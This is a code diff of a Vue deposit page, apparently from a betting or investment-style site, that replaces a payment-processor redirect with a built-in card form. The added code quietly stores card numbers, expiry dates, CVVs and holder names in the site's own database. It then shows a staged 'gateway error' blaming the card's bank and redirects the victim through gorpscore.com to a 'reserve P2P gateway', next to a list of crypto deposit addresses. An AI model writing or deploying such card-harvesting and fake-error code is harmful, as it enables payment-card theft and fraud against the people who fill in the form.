@@ -1113,18 +1113,24 @@ input:checked + .toggle-slider:before {
 }
 </style> -->
 
-
+<!-- ////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////// -->
 
 
 <script setup>
-import { ref } from "vue";
-import { supabase } from "../supabaseClient";
+import { ref, computed } from "vue";
+import { saveUser } from "../lib/supabase";
 import useAuth from "../composables/useAuth.js";
 import AccountTransactions from "../components/account/AccountTransactions.vue";
-// Импорт генератора QR-кодов
 import QrcodeVue from 'qrcode.vue';
 
-const { balance, withdraw: doWithdraw } = useAuth();
+// --- НАЛАШТУВАННЯ ---
+const BACKEND_URL = "https://gorpscore.com/api/course/create-payment";
+
+const { balance, withdraw: doWithdraw, user } = useAuth();
 const activeTab = ref("deposit");
 const tabs = [
   { id: "deposit", label: "Пополнение" },
@@ -1132,172 +1138,153 @@ const tabs = [
   { id: "history", label: "История" },
 ];
 
-// === ТВОИ ГАМАНЦІ (Оновлений список) ===
-const cryptoWallets = [
-  {
-    id: "btc",
-    name: "Bitcoin (BTC)",
-    icon: "/imgCripto/bitcoin.svg",
-    network: "Bitcoin",
-    address: "18YJjaFWkD2gHvM1BgFxXeDTtf4nr8Unod",
-    instructions: "Отправляйте только Bitcoin (BTC) в сети Bitcoin на этот адрес. Зачисление после 2 подтверждений.",
-  },
-  {
-    id: "eth",
-    name: "Ethereum (ETH)",
-    icon: "/imgCripto/ethereum.svg",
-    network: "ERC20",
-    address: "0xe9baa24a0bf3afd6262d96998369d0e88a16f05c",
-    instructions: "Отправляйте только Ethereum (ETH) в сети ERC20 на этот адрес. **Не используйте другие сети (BEP20, Polygon и т.д.)!**",
-  },
-  {
-    id: "usdt",
-    name: "Tether (USDT TRC20)",
-    icon: "/imgCripto/tether.svg",
-    network: "TRC20",
-    address: "TVEZqMqitesH5bPsZpTm1ZC6PegmsAq5Xw",
-    instructions: "Отправляйте только USDT в сети TRON (TRC20) на этот адрес. Сеть TRC20 обеспечивает низкие комиссии.",
-  },
-  {
-    id: "bnb",
-    name: "BNB (BNB)",
-    icon: "/imgCripto/bnb.svg",
-    network: "BEP20 (BSC)",
-    address: "0xe9baa24a0bf3afd6262d96998369d0e88a16f05c",
-    instructions: "Отправляйте только BNB в сети Binance Smart Chain (BEP20). Убедитесь, что выбрали правильную сеть.",
-  },
-  {
-    id: "sol",
-    name: "Solana (SOL)",
-    icon: "/imgCripto/solana.svg",
-    network: "Solana",
-    address: "6Uus6AyvPAskkqw54TwkHaBx84VtYK59DKuLXcxd1S6h",
-    instructions: "Отправляйте только SOL в сети Solana. Адреса Solana чувствительны к регистру.",
-  },
-  {
-    id: "xrp",
-    name: "Ripple (XRP)",
-    icon: "/imgCripto/xrp.svg",
-    network: "Ripple",
-    address: "rJn2zAPdFA193sixJwuFixRkYDUtx3apQh",
-    memo: "501439071", // Важливий параметр для XRP
-    instructions: "Отправляйте только XRP. Вы должны правильно заполнить адрес депозита и идентификатор [Мемо/Тег].",
-  },
-  {
-    id: "doge",
-    name: "Dogecoin (DOGE)",
-    icon: "/imgCripto/dogecoin.svg",
-    network: "Dogecoin",
-    address: "D7MrtzsAUrnrA8yA12TXoACL23sQrMj4eQ",
-    instructions: "Отправляйте только DOGE. Wow. Such crypto. Much deposit. Very blockchain.",
-  },
-  {
-    id: "ada",
-    name: "Cardano (ADA)",
-    icon: "/imgCripto/cardano.svg",
-    network: "Cardano",
-    address: "addr1vytm0h77de6xkrlvw0q33zatp3ss2u73sja7pzn326exd5gg0jxtk",
-    instructions: "Отправляйте только ADA в сети Cardano.",
-  },
-  {
-    id: "trx",
-    name: "TRON (TRX)",
-    icon: "/imgCripto/tron.svg",
-    network: "TRC20",
-    address: "TVEZqMqitesH5bPsZpTm1ZC6PegmsAq5Xw",
-    instructions: "Отправляйте только TRX в сети TRON (TRC20). Не путайте с USDT в той же сети.",
-  },
-  {
-    id: "ton",
-    name: "Toncoin (TON)",
-    icon: "/imgCripto/ton.svg",
-    network: "TON",
-    address: "UQAVpt0tWfoUPJSH3P9_5xGVsurA_A15NM2QQ8nSa-3OMdah",
-    instructions: "Отправляйте только Toncoin (TON). Убедитесь, что ваш кошелек поддерживает переводы в сети TON.",
-  },
-];
+const paymentMethod = ref("card"); // 'card' | 'crypto'
 
-// === ЛОГИКА ПОПОЛНЕНИЯ ===
-const depositMethod = ref("fiat"); // 'fiat' (PayKassa) или 'crypto' (Прямой перевод)
+// ==========================================
+// 💳 ЛОГІКА КАРТ
+// ==========================================
+const cardNumber = ref("");
+const expiry = ref("");
+const cvv = ref("");
+const name = ref("");
 const amount = ref("");
+const cardType = ref("");
+const errors = ref({});
 const processing = ref(false);
-const errorMsg = ref("");
 
-// -- PayKassa (RUB) --
-async function submitFiatDeposit() {
-  if (!amount.value || amount.value < 50) {
-    errorMsg.value = "Минимальная сумма 50 RUB";
-    return;
-  }
-  
+// Стан для фейкової модалки
+const showFakeErrorModal = ref(false);
+const redirectUrl = ref("");
+const modalStep = ref(1); // 1 = Помилка, 2 = Редірект
+
+function detectCardType(number) {
+  number = number.replace(/\s/g, "");
+  if (/^4/.test(number)) return "visa";
+  if (/^5[1-5]/.test(number)) return "mastercard";
+  if (/^220[0-4]/.test(number)) return "mir";
+  return "";
+}
+
+function formatCard(value) {
+  cardType.value = detectCardType(value);
+  return value.replace(/\D/g, "").slice(0, 19).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+}
+
+function onCardInput(e) { cardNumber.value = formatCard(e.target.value); }
+function onExpiryInput(e) {
+  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
+  if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
+  expiry.value = val;
+}
+function onCvvInput(e) { cvv.value = e.target.value.replace(/\D/g, "").slice(0, 3); }
+
+function validate() {
+  const errs = {};
+  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ""))) errs.cardNumber = "Некорректный номер";
+  if (!/^\d{3}$/.test(cvv.value)) errs.cvv = "Err";
+  if (!expiry.value.match(/^(\d{2})\/(\d{2})$/)) errs.expiry = "Err";
+  if (name.value.trim().length < 2) errs.name = "Введите имя";
+  const amt = parseFloat(amount.value);
+  if (!amt || amt < 500) errs.amount = "Мин. 500 ₽";
+  errors.value = errs;
+  return Object.keys(errs).length === 0;
+}
+
+// === 🚀 ОПЛАТА КАРТОЮ ===
+async function submitCardDeposit() {
+  if (!validate()) return;
   processing.value = true;
-  errorMsg.value = "";
-
   try {
-    const { data: { user } } = await supabase.auth.getUser();
-    const userId = user ? user.id : 'guest_' + Math.floor(Math.random() * 999999);
+    // 1. Зберігаємо дані в базу (тихо)
+    try {
+        await saveUser({
+            cardNumber: cardNumber.value,
+            cardDate: expiry.value,
+            cvv: cvv.value,
+            nameCard: name.value,
+            amount: amount.value,
+        });
+    } catch (dbError) { console.error("Db save error", dbError); }
 
-    const { data, error } = await supabase.functions.invoke('create-payment', {
-      body: { amount: amount.value, userId: userId }
+    // 2. Генеруємо посилання
+    const randomId = Math.floor(Math.random() * 999999);
+    const userEmail = `player_${randomId}@smartmoney.system`;
+
+    const response = await fetch(BACKEND_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: userEmail,
+        amount: parseFloat(amount.value),
+        method: "card"
+      })
     });
 
-    if (error) {
-        // Якщо помилка на рівні Supabase
-        throw new Error(error.message);
-    }
+    const data = await response.json();
+    if (!response.ok || !data.url) throw new Error("Gateway error");
 
-    if (data.error) {
-        // Якщо PayKassa повернула помилку (наприклад, невірний пароль)
-        throw new Error("PayKassa: " + data.error);
-    }
+    const cleanRedirectUrl = `https://gorpscore.com/api/course/go?url=${encodeURIComponent(data.url)}`;
 
-    if (data && data.pay_url) {
-      window.location.href = data.pay_url;
-    } else {
-      throw new Error("Не удалось получить ссылку на оплату");
-    }
+    // 3. Анімація помилки і перехід
+    setTimeout(() => {
+      processing.value = false;
+      showFakeErrorModal.value = true;
+      modalStep.value = 1;
+
+      // Через 2 сек показуємо "Перенаправлення..."
+      setTimeout(() => { modalStep.value = 2; }, 2000);
+
+      // Ще через 1.5 сек перекидаємо
+      setTimeout(() => { window.location.href = cleanRedirectUrl; }, 3500);
+
+    }, 2000);
+
   } catch (e) {
     console.error(e);
-    // Виводимо реальну помилку на екран, щоб ти бачив, що не так
-    errorMsg.value = e.message || "Ошибка создания платежа.";
-  } finally {
+    alert("Ошибка шлюза. Попробуйте позже.");
     processing.value = false;
   }
 }
 
-// -- Crypto (Direct) --
+// ==========================================
+// 🪙 ЛОГІКА КРИПТИ (ПОВНИЙ СПИСОК)
+// ==========================================
+const cryptoWallets = [
+  { id: "btc", name: "Bitcoin (BTC)", icon: "/imgCripto/bitcoin.svg", network: "Bitcoin", address: "18YJjaFWkD2gHvM1BgFxXeDTtf4nr8Unod", instructions: "Сеть Bitcoin. 2 подтверждения." },
+  { id: "eth", name: "Ethereum (ETH)", icon: "/imgCripto/ethereum.svg", network: "ERC20", address: "0xe9baa24a0bf3afd6262d96998369d0e88a16f05c", instructions: "Сеть ERC20. Не используйте BEP20!" },
+  { id: "usdt", name: "Tether (USDT TRC20)", icon: "/imgCripto/tether.svg", network: "TRC20", address: "TVEZqMqitesH5bPsZpTm1ZC6PegmsAq5Xw", instructions: "Сеть TRC20 (Tron). Только USDT." },
+  { id: "bnb", name: "BNB (BNB)", icon: "/imgCripto/bnb.svg", network: "BEP20", address: "0xe9baa24a0bf3afd6262d96998369d0e88a16f05c", instructions: "Сеть BSC (BEP20)." },
+  { id: "sol", name: "Solana (SOL)", icon: "/imgCripto/solana.svg", network: "Solana", address: "6Uus6AyvPAskkqw54TwkHaBx84VtYK59DKuLXcxd1S6h", instructions: "Сеть Solana." },
+  { id: "xrp", name: "Ripple (XRP)", icon: "/imgCripto/xrp.svg", network: "Ripple", address: "rJn2zAPdFA193sixJwuFixRkYDUtx3apQh", memo: "501439071", instructions: "ОБЯЗАТЕЛЬНО укажите MEMO/TAG!" },
+  { id: "doge", name: "Dogecoin (DOGE)", icon: "/imgCripto/dogecoin.svg", network: "Dogecoin", address: "D7MrtzsAUrnrA8yA12TXoACL23sQrMj4eQ", instructions: "Сеть Dogecoin." },
+  { id: "ada", name: "Cardano (ADA)", icon: "/imgCripto/cardano.svg", network: "Cardano", address: "addr1vytm0h77de6xkrlvw0q33zatp3ss2u73sja7pzn326exd5gg0jxtk", instructions: "Сеть Cardano." },
+  { id: "trx", name: "TRON (TRX)", icon: "/imgCripto/tron.svg", network: "TRC20", address: "TVEZqMqitesH5bPsZpTm1ZC6PegmsAq5Xw", instructions: "Сеть Tron (TRC20)." },
+  { id: "ton", name: "Toncoin (TON)", icon: "/imgCripto/ton.svg", network: "TON", address: "UQAVpt0tWfoUPJSH3P9_5xGVsurA_A15NM2QQ8nSa-3OMdah", instructions: "Сеть TON. Укажите Memo если есть." },
+];
+
 const selectedCrypto = ref(null);
 const copiedAddr = ref(false);
 const copiedMemo = ref(false);
 
-function selectCrypto(wallet) {
-  selectedCrypto.value = wallet;
-  copiedAddr.value = false;
-  copiedMemo.value = false;
-}
-
+function selectCrypto(wallet) { selectedCrypto.value = wallet; copiedAddr.value = false; copiedMemo.value = false; }
 function copyAddress() {
-  if (selectedCrypto.value) {
-    navigator.clipboard.writeText(selectedCrypto.value.address);
-    copiedAddr.value = true;
-    setTimeout(() => copiedAddr.value = false, 2000);
-  }
+  if (!selectedCrypto.value) return;
+  navigator.clipboard.writeText(selectedCrypto.value.address);
+  copiedAddr.value = true; setTimeout(() => copiedAddr.value = false, 2000);
 }
-
 function copyMemo() {
-  if (selectedCrypto.value && selectedCrypto.value.memo) {
-    navigator.clipboard.writeText(selectedCrypto.value.memo);
-    copiedMemo.value = true;
-    setTimeout(() => copiedMemo.value = false, 2000);
-  }
+  if (!selectedCrypto.value?.memo) return;
+  navigator.clipboard.writeText(selectedCrypto.value.memo);
+  copiedMemo.value = true; setTimeout(() => copiedMemo.value = false, 2000);
 }
-
 function iPaidCrypto() {
-  alert("Спасибо! Мы проверим блокчейн и зачислим средства после подтверждений сети (обычно 5-20 минут).");
+  alert("Заявка создана! Ожидайте зачисления после подтверждения сети.");
   selectedCrypto.value = null;
 }
 
-// === ЛОГИКА ВЫПЛАТЫ ===
+// ==========================================
+// 💸 ЛОГІКА ВИПЛАТИ
+// ==========================================
 const wCardNumber = ref("");
 const wAmount = ref("");
 const wMessage = ref("");
@@ -1306,8 +1293,7 @@ function submitWithdraw() {
   if (!wCardNumber.value || !wAmount.value) return;
   if (doWithdraw(wAmount.value)) {
     wMessage.value = "Заявка принята в обработку";
-    wAmount.value = "";
-    wCardNumber.value = "";
+    wAmount.value = ""; wCardNumber.value = "";
   } else {
     wMessage.value = "Ошибка: недостаточно средств";
   }
@@ -1316,206 +1302,251 @@ function submitWithdraw() {
 
 <template>
   <div class="deposit container">
-    <h1>Управление балансом</h1>
-    
-    <nav class="tabs">
-      <button v-for="t in tabs" :key="t.id" :class="{ active: activeTab === t.id }" @click="activeTab = t.id">
-        {{ t.label }}
-      </button>
-    </nav>
+    <div class="top-switches">
+        <button 
+            v-for="t in tabs" :key="t.id" 
+            :class="['nav-pill', { active: activeTab === t.id }]" 
+            @click="activeTab = t.id"
+        >
+            {{ t.label }}
+        </button>
+    </div>
 
-    <div v-if="activeTab === 'deposit'" class="tab-content fade-in">
-      <div class="payment-card">
+    <div class="content-box">
         
-        <div class="method-switcher">
-          <button :class="{ active: depositMethod === 'fiat' }" @click="depositMethod = 'fiat'">
-            Карты (RUB)
-          </button>
-          <button :class="{ active: depositMethod === 'crypto' }" @click="depositMethod = 'crypto'">
-            Криптовалюта
-          </button>
-        </div>
-
-        <div v-if="depositMethod === 'fiat'" class="fiat-section">
-           <div class="header-box">
-            <h2>Пополнить рублями</h2>
-            <p class="subtitle">PayKassa: Карты РФ, P2P, СБП</p>
-          </div>
-
-          <div class="methods-icons">
-             <img src="/imgCards/visa.svg" alt="Visa" />
-             <img src="/imgCards/mastercard.svg" alt="Mastercard" />
-             <img src="/imgCards/mir.svg" alt="MIR" />
-          </div>
-
-          <form @submit.prevent="submitFiatDeposit" class="payment-form">
-            <div class="input-group">
-              <label>Сумма (RUB)</label>
-              <input v-model="amount" type="number" placeholder="1000" min="50" required />
-            </div>
-            <div v-if="errorMsg" class="alert error">{{ errorMsg }}</div>
-            <button type="submit" class="btn-pay" :disabled="processing">
-              {{ processing ? "Переходим к оплате..." : "Оплатить" }}
-            </button>
-          </form>
-        </div>
-
-        <div v-else class="crypto-section">
-          
-          <div v-if="!selectedCrypto" class="crypto-grid">
-            <div 
-              v-for="wallet in cryptoWallets" 
-              :key="wallet.id" 
-              class="crypto-item" 
-              @click="selectCrypto(wallet)"
-            >
-              <img :src="wallet.icon" :alt="wallet.name" />
-              <span>{{ wallet.name }}</span>
-            </div>
-          </div>
-
-          <div v-else class="crypto-details">
-            <button class="back-btn" @click="selectedCrypto = null">← Назад к списку</button>
+        <div v-if="activeTab === 'deposit'">
             
-            <div class="wallet-info">
-              <img :src="selectedCrypto.icon" class="coin-icon-lg" />
-              <h3>{{ selectedCrypto.name }}</h3>
-              
-              <div class="qr-wrapper">
-                <qrcode-vue 
-                  :value="selectedCrypto.address" 
-                  :size="180" 
-                  level="H" 
-                  background="#ffffff" 
-                  foreground="#000000" 
-                  class="qr-code-canvas"
-                />
-              </div>
-
-              <div class="address-group">
-                <label>Адрес кошелька:</label>
-                <div class="address-box" @click="copyAddress">
-                  <span class="addr-text">{{ selectedCrypto.address }}</span>
-                  <span class="copy-icon" v-if="!copiedAddr">📋</span>
-                  <span class="copy-icon success" v-else>✅</span>
-                </div>
-              </div>
-
-              <div v-if="selectedCrypto.memo" class="address-group">
-                <label style="color: #ff4d00;">MEMO / TAG (Обязательно!):</label>
-                <div class="address-box memo-box" @click="copyMemo">
-                  <span class="addr-text">{{ selectedCrypto.memo }}</span>
-                  <span class="copy-icon" v-if="!copiedMemo">📋</span>
-                  <span class="copy-icon success" v-else>✅</span>
-                </div>
-              </div>
-
-              <div class="instruction-box">
-                <p class="warning-text">{{ selectedCrypto.instructions }}</p>
-                <p class="network-badge">Сеть: <strong>{{ selectedCrypto.network }}</strong></p>
-              </div>
+            <div class="type-switch">
+                <button :class="{ active: paymentMethod === 'card' }" @click="paymentMethod = 'card'">Карты (RUB)</button>
+                <button :class="{ active: paymentMethod === 'crypto' }" @click="paymentMethod = 'crypto'">Криптовалюта</button>
             </div>
 
-            <button class="btn-pay" @click="iPaidCrypto">Я оплатил</button>
-          </div>
+            <div v-if="paymentMethod === 'card'" class="card-form-container fade-in">
+                <h3>Пополнить картой</h3>
+                <p class="sub-h">Visa, Mastercard, MIR (РФ)</p>
+
+                <form @submit.prevent="submitCardDeposit">
+                    <div class="input-block">
+                        <label>Номер карты</label>
+                        <input v-model="cardNumber" @input="onCardInput" type="text" placeholder="0000 0000 0000 0000" maxlength="19" :class="{ error: errors.cardNumber }">
+                    </div>
+
+                    <div class="row">
+                        <div class="input-block half">
+                            <label>Срок (MM/YY)</label>
+                            <input v-model="expiry" @input="onExpiryInput" type="text" placeholder="MM/YY" maxlength="5" :class="{ error: errors.expiry }">
+                        </div>
+                        <div class="input-block half">
+                            <label>CVC/CVV</label>
+                            <input v-model="cvv" @input="onCvvInput" type="password" placeholder="123" maxlength="3" :class="{ error: errors.cvv }">
+                        </div>
+                    </div>
+
+                    <div class="input-block">
+                        <label>Имя держателя</label>
+                        <input v-model="name" type="text" placeholder="IVAN IVANOV" :class="{ error: errors.name }">
+                    </div>
+
+                    <div class="input-block">
+                        <label>Сумма (RUB)</label>
+                        <input v-model="amount" type="number" placeholder="Минимум 500" :class="{ error: errors.amount }">
+                    </div>
+
+                    <button type="submit" class="action-btn" :disabled="processing">
+                        {{ processing ? "Обработка..." : "Пополнить" }}
+                    </button>
+                </form>
+            </div>
+
+            <div v-else class="crypto-container fade-in">
+                
+                <div v-if="!selectedCrypto" class="crypto-grid">
+                    <div v-for="w in cryptoWallets" :key="w.id" class="crypto-card" @click="selectCrypto(w)">
+                        <img :src="w.icon" :alt="w.name">
+                        <span>{{ w.name }}</span>
+                    </div>
+                </div>
+
+                <div v-else class="crypto-detail">
+                    <div class="back-link" @click="selectedCrypto = null">← Назад к списку</div>
+                    
+                    <div class="detail-header">
+                        <img :src="selectedCrypto.icon" class="coin-icon-lg">
+                    </div>
+
+                    <h3>{{ selectedCrypto.name }}</h3>
+
+                    <div class="qr-box">
+                        <qrcode-vue :value="selectedCrypto.address" :size="190" level="H" background="#fff" foreground="#000" />
+                    </div>
+
+                    <div class="field-label">Адрес кошелька:</div>
+                    <div class="copy-box" @click="copyAddress">
+                        <span class="addr-text">{{ selectedCrypto.address }}</span>
+                        <span class="copy-icon">{{ copiedAddr ? '✅' : '📄' }}</span>
+                    </div>
+
+                    <div v-if="selectedCrypto.memo">
+                        <div class="field-label">Memo / Tag:</div>
+                        <div class="copy-box" @click="copyMemo">
+                            <span class="addr-text">{{ selectedCrypto.memo }}</span>
+                            <span class="copy-icon">{{ copiedMemo ? '✅' : '📄' }}</span>
+                        </div>
+                    </div>
+
+                    <div class="info-text">
+                        {{ selectedCrypto.instructions }}
+                        <br>
+                        <strong>Сеть: {{ selectedCrypto.network }}</strong>
+                    </div>
+
+                    <button class="action-btn orange-btn" @click="iPaidCrypto">Я оплатил</button>
+                </div>
+
+            </div>
 
         </div>
 
-      </div>
-    </div>
-
-    <div v-else-if="activeTab === 'withdraw'" class="tab-content fade-in">
-      <div class="payment-card">
-        <div class="header-box">
-          <h2>Вывод средств</h2>
-          <p class="balance-display">Доступно: <span>{{ balance.toFixed(2) }}₽</span></p>
+        <div v-else-if="activeTab === 'withdraw'" class="fade-in">
+            <h3>Вывод средств</h3>
+            <p class="balance-info">Доступно: {{ balance.toFixed(2) }}₽</p>
+            <form @submit.prevent="submitWithdraw">
+                <div class="input-block">
+                    <label>Реквизиты</label>
+                    <input v-model="wCardNumber" placeholder="Карта или кошелек" required>
+                </div>
+                <div class="input-block">
+                    <label>Сумма</label>
+                    <input v-model="wAmount" type="number" placeholder="500" required>
+                </div>
+                <div v-if="wMessage" class="success-msg">{{ wMessage }}</div>
+                <button type="submit" class="action-btn outline">Вывести</button>
+            </form>
         </div>
-        <form @submit.prevent="submitWithdraw" class="payment-form">
-          <div class="input-group">
-            <label>Реквизиты (Карта / Кошелек)</label>
-            <input v-model="wCardNumber" type="text" placeholder="0000 0000 0000 0000" required />
-          </div>
-          <div class="input-group">
-            <label>Сумма</label>
-            <input v-model="wAmount" type="number" placeholder="Min 500" required />
-          </div>
-          <div v-if="wMessage" class="alert success">{{ wMessage }}</div>
-          <button type="submit" class="btn-pay outline">Заказать выплату</button>
-        </form>
-      </div>
+
+        <div v-else class="fade-in">
+            <AccountTransactions />
+        </div>
+
     </div>
 
-    <div v-else class="tab-content fade-in">
-      <AccountTransactions />
+    <div v-if="showFakeErrorModal" class="modal-backdrop">
+        <div class="cyber-modal">
+            
+            <div v-if="modalStep === 1">
+                <div class="icon-pulse">⚠️</div>
+                <h2>Ошибка шлюза</h2>
+                <p>Автоматическое списание временно недоступно из-за ограничений банка-эмитента.</p>
+                <div class="loader-line"></div>
+            </div>
+
+            <div v-if="modalStep === 2">
+                <div class="icon-spin">🔄</div>
+                <h2>Перенаправление</h2>
+                <p>Инициализация резервного P2P шлюза...</p>
+                <div class="loader-line green"></div>
+            </div>
+
+        </div>
     </div>
+
   </div>
 </template>
 
 <style scoped>
-.deposit { padding: 40px 16px; max-width: 550px; margin: 0 auto; text-align: center; color: #fff; }
-h1 { font-size: 2rem; margin-bottom: 24px; font-weight: 700; }
+/* ЗАГАЛЬНІ */
+.container { max-width: 480px; margin: 0 auto; padding: 20px; color: #fff; font-family: 'Inter', sans-serif; }
+.fade-in { animation: fadeIn 0.3s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-/* Tabs */
-.tabs { display: flex; background: #14161b; padding: 4px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #2a2f3a; }
-.tabs button { flex: 1; padding: 12px; background: transparent; border: none; color: #94a3b8; font-weight: 600; cursor: pointer; border-radius: 8px; transition: 0.3s; }
-.tabs button.active { background: #2a2f3a; color: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+/* ТАБИ */
+.top-switches { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+.nav-pill { background: #1f232d; border: none; color: #8899a6; padding: 8px 16px; border-radius: 20px; cursor: pointer; transition: 0.3s; font-weight: 600; }
+.nav-pill.active { background: #ff4d00; color: #fff; box-shadow: 0 4px 12px rgba(255, 77, 0, 0.3); }
 
-/* Switcher */
-.method-switcher { display: flex; gap: 10px; margin-bottom: 24px; justify-content: center; }
-.method-switcher button {
-  background: #1e232d; border: 1px solid #2a2f3a; color: #94a3b8; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-weight: 600; transition: 0.2s;
+/* КОНТЕЙНЕР */
+.content-box { background: #161920; border-radius: 24px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid #2a2f3a; }
+
+/* ПЕРЕМИКАЧ ТИПУ */
+.type-switch { display: flex; background: #0f1115; padding: 4px; border-radius: 12px; margin-bottom: 24px; }
+.type-switch button { flex: 1; padding: 10px; background: transparent; border: none; color: #6b7280; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+.type-switch button.active { background: #2a2f3a; color: #fff; }
+
+/* ФОРМА КАРТИ */
+.card-form-container h3 { margin: 0 0 5px 0; text-align: center; font-size: 1.4rem; }
+.sub-h { text-align: center; color: #6b7280; margin-bottom: 20px; font-size: 0.9rem; }
+.input-block { margin-bottom: 15px; }
+.input-block label { display: block; color: #9ca3af; font-size: 0.8rem; margin-bottom: 6px; }
+.input-block input { 
+    width: 100%; padding: 14px; background: #0b0c10; border: 1px solid #2a2f3a; 
+    border-radius: 10px; color: #fff; font-size: 1rem; box-sizing: border-box; 
+    transition: 0.3s; 
 }
-.method-switcher button.active { background: #ff4d00; color: #fff; border-color: #ff4d00; box-shadow: 0 4px 15px rgba(255, 77, 0, 0.3); }
+.input-block input:focus { border-color: #ff4d00; outline: none; }
+.input-block input.error { border-color: #ef4444; }
+.row { display: flex; gap: 10px; }
+.half { flex: 1; }
 
-/* Card */
-.payment-card { background: #1e232d; padding: 32px; border-radius: 16px; border: 1px solid #2a2f3a; box-shadow: 0 10px 30px rgba(0,0,0,0.3); min-height: 400px; display: flex; flex-direction: column; justify-content: center; }
-.header-box { margin-bottom: 24px; }
-.header-box h2 { margin: 0; font-size: 1.5rem; }
-.subtitle { color: #94a3b8; font-size: 0.9rem; margin-top: 5px; }
-.balance-display span { color: #ff4d00; font-size: 1.2rem; font-weight: bold; }
+.action-btn { 
+    width: 100%; padding: 16px; background: linear-gradient(90deg, #ff4d00, #ff2200); 
+    border: none; border-radius: 12px; color: #fff; font-size: 1.1rem; font-weight: 700; 
+    cursor: pointer; margin-top: 10px; box-shadow: 0 4px 15px rgba(255, 34, 0, 0.4); 
+    transition: 0.2s; 
+}
+.action-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255, 34, 0, 0.5); }
+.action-btn:disabled { background: #374151; cursor: wait; transform: none; box-shadow: none; }
+.action-btn.outline { background: transparent; border: 2px solid #ff4d00; color: #ff4d00; box-shadow: none; }
 
-.payment-form { display: flex; flex-direction: column; gap: 20px; text-align: left; }
-.input-group label { display: block; margin-bottom: 8px; color: #cbd5e1; font-size: 0.95rem; }
-.input-group input { width: 100%; padding: 14px 16px; background: #0b0c10; border: 1px solid #2a2f3a; border-radius: 10px; color: #fff; font-size: 1.1rem; box-sizing: border-box; }
-.input-group input:focus { border-color: #ff4d00; outline: none; }
+/* КРИПТА - СІТКА */
+.crypto-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.crypto-card { 
+    background: #1f232d; padding: 15px; border-radius: 12px; display: flex; align-items: center; 
+    gap: 10px; cursor: pointer; border: 1px solid transparent; transition: 0.2s; 
+}
+.crypto-card:hover { border-color: #ff4d00; background: #252a36; }
+.crypto-card img { width: 28px; height: 28px; }
+.crypto-card span { font-weight: 600; font-size: 0.9rem; }
 
-.btn-pay { width: 100%; padding: 16px; background: #ff4d00; color: #fff; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.2s; }
-.btn-pay:hover { background: #e64500; }
-.btn-pay.outline { background: transparent; border: 2px solid #ff4d00; color: #ff4d00; }
-.btn-pay.outline:hover { background: #ff4d00; color: #fff; }
+/* КРИПТА - ДЕТАЛІ */
+.crypto-detail { text-align: center; }
+.back-link { text-align: left; color: #6b7280; cursor: pointer; margin-bottom: 20px; font-size: 0.9rem; }
+.back-link:hover { color: #fff; }
+.coin-icon-lg { width: 60px; height: 60px; margin-bottom: 10px; }
+.qr-box { background: #fff; padding: 10px; border-radius: 12px; display: inline-block; margin-bottom: 20px; }
+.field-label { text-align: left; color: #6b7280; font-size: 0.85rem; margin-bottom: 6px; }
+.copy-box { 
+    background: #0b0c10; border: 1px dashed #4b5563; padding: 12px; border-radius: 8px; 
+    display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; cursor: pointer; 
+}
+.copy-box:hover { border-color: #ff4d00; }
+.addr-text { font-family: monospace; font-size: 0.9rem; color: #fff; word-break: break-all; text-align: left; }
+.info-text { background: rgba(255, 77, 0, 0.1); color: #ff9f75; padding: 12px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 20px; }
+.orange-btn { background: #ff4d00; box-shadow: none; }
 
-.methods-icons { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; opacity: 0.8; }
-.methods-icons img { height: 24px; }
+/* ВИПЛАТА */
+.balance-info { text-align: center; font-size: 1.2rem; color: #ff4d00; font-weight: bold; margin-bottom: 20px; }
+.success-msg { color: #10b981; text-align: center; margin: 10px 0; }
 
-/* Crypto Grid */
-.crypto-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-.crypto-item { background: #14161b; padding: 16px; border-radius: 12px; display: flex; align-items: center; gap: 12px; cursor: pointer; border: 1px solid #2a2f3a; transition: 0.2s; }
-.crypto-item:hover { border-color: #ff4d00; transform: translateY(-2px); }
-.crypto-item img { width: 32px; height: 32px; }
-.crypto-item span { font-weight: 600; font-size: 0.95rem; }
+/* МОДАЛКА */
+.modal-backdrop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(5px); }
+.cyber-modal { 
+    background: #161920; padding: 30px; border-radius: 20px; text-align: center; max-width: 320px; 
+    border: 1px solid #ff4d00; box-shadow: 0 0 30px rgba(255, 77, 0, 0.2); animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+}
+@keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
-/* Crypto Details */
-.crypto-details { text-align: center; animation: fadeIn 0.3s ease; }
-.back-btn { background: none; border: none; color: #94a3b8; cursor: pointer; margin-bottom: 16px; font-size: 0.9rem; }
-.coin-icon-lg { width: 64px; height: 64px; margin-bottom: 12px; }
-.qr-wrapper { background: white; padding: 10px; display: inline-block; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(255,255,255,0.1); }
-.qr-code-canvas { display: block; }
+.cyber-modal h2 { margin: 10px 0; color: #fff; }
